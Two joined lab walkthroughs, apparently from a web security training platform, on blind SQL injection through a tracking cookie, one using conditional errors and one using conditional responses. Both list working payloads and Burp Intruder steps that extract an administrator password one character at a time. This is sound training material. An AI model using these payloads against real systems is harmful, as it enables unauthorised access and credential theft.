# Lab: Blind SQL Injection with Conditional Errors

## Goal
- Extract administrator password  
- Login as administrator  

---

## Step 1: Intercept Request
- Open the lab  
- Enable Burp Proxy  
- Capture the request  
- Send it to Repeater  

Observed cookie:

TrackingId=xyz


---

## Step 2: Confirm SQL Injection (Error-Based)

Payload:

'||(SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE '' END)||'


- TRUE → Internal Server Error (500)  
- FALSE → Normal response  

Injection confirmed  

---

## Step 3: Find Password Length

Payload:

'||(SELECT CASE WHEN LENGTH(password)=X THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'


- Replace `X` with numbers (1,2,3...)  
- When condition is TRUE → 500 error  

Found correct password length  

---

## Step 4: Extract Password (Character by Character)

Payload:

'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'


- Change position:
  - 1 → 2 → 3 → ...  
- Try characters:
  - a–z  
  - 0–9  

- If correct → 500 error  

---

## Step 5: Automate Using Burp Intruder

- Send request to Intruder  
- Attack type: Sniper  
- Mark payload position (character)  

Payload list:

a
b
c
...
z
0
1
...
9


- Start attack  
- Observe:
  - Status = 500 → correct character  

Repeat for all positions  

---

## Step 6: Login

- Username: `administrator`  
- Password: (extracted password)  

Lab Solved  

---

## Key Payloads

Check condition:

'||(SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE '' END)||'


Find length:

'||(SELECT CASE WHEN LENGTH(password)=X THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'


Extract character:

'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'# Lab: Blind SQL injection with conditional responses

## Goal
- Find administrator password  
- Login as administrator  

---

## Step 1: Intercept Request
- Open lab  
- Capture request in Burp  
- Send to Repeater  
- Look at cookie:

TrackingId=xyz

---

## Step 2: Check Injection

' AND '1'='1  
→ Welcome back appears  

' AND '1'='2  
→ No Welcome back  

Injection confirmed  

---

## Step 3: Check Query Works

' AND (SELECT 'a')='a  

→ If "Welcome back" → working  

---

## Step 4: Check Admin User

' AND (SELECT 'a' FROM users WHERE username='administrator')='a  

→ Confirms admin exists  

---

## Step 5: Find Password Length

' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=1--  

Increase number until TRUE  

---

## Step 6: Find Password (Character by Character)

' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a  

- Try a–z, 0–9  
- Move position: 1 → 2 → 3 ...  

---

## Step 7: Automate (Intruder)

- Send to Intruder  
- Attack type: Sniper  
- Payload: a–z0–9  
- Check "Welcome back"  

---

## Step 8: Login

Username: administrator  
Password: (found password)  

Lab Solved  

---

## Key Payloads

' AND '1'='1  
' AND '1'='2  
' AND (SELECT 'a')='a  
' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=X--  
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a  
